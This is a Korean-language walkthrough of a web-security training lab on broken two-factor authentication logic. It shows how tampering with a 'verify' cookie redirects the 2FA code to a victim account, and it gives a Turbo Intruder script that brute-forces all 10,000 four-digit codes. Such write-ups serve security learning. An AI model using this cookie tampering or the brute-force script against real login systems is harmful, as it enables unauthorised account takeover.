# 🚩Lab: 2FA broken logic

```text
This lab's two-factor authentication is vulnerable due to its flawed logic. To solve the lab, access Carlos's account page.

Your credentials: wiener:peter
Victim's username: carlos
You also have access to the email server to receive your 2FA verification code.
```

### 🔍 분석 및 공격 과정
1. wiener:peter로 로그인해본다.
2. mfa-code를 이메일로 전송하여 2차인증을 하는 단계로 넘어간다.
3. 1단계 인증을 성공했을 때는 아래와 같은 응답을 받는다.
```http
HTTP/2 302 Found
Location: /login2
Set-Cookie: verify=wiener; HttpOnly
Set-Cookie: session=prWKnEyQYQ9hIrq1ZxLWgEsizG7DTroj; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Content-Length: 0
```
4. `verify` 쿠키가 wiener로 설정되며, session 쿠키가 새로발급된다. 그후 `/login2`로 리다이렉션하며 `verify`쿠키를 포함시켜 `GET`한다. 해당 GET 요청에서 쿠키 값을 `carlos`로 바꾸면 `wiener`의 이메일에 인증코드가 오지 않는지 체크한다.
5. 오지않음. 아마 carlos의 이메일로 mfa-code가 전송되었을 것이라고 가정하고 mfa-code를 brute-force해보자. 스크립트는 터보 인트루더로 작성하였다.
```python
def queueRequests(target, wordlists):
  engine = RequestEngine(
      endpoint=target.endpoint,
      concurrentConnections=50,
      requestsPerConnection=100,
      pipeline=True,
      engine=Engine.BURP2,
  )
  a = [ str(i).zfill(4) for i in range(0, 10000)]

    

  for mfa in a:
    engine.queue(target.req, mfa)


def handleResponse(req, interesting):
  table.add(req)
```
6. 테이블중 상태코드가 302인 요청의 mfa-code 페이로드 체크 -> 제출하여 로그인에 성공.
                        
### 💡 취약점 원리
 1차인증후 발급되는 verify 쿠키의 값을 바탕으로 1차인증을 완료한 것으로 넘어가며 해당계정에 mfa-code를 보내는 논리적 결함이 존재한다. 또한 mfa-code에 대한 brute-force에 대한 방어도 구현되어있지 않을 뿐더러 4자리의 digit이기에 보안에 취약하다.
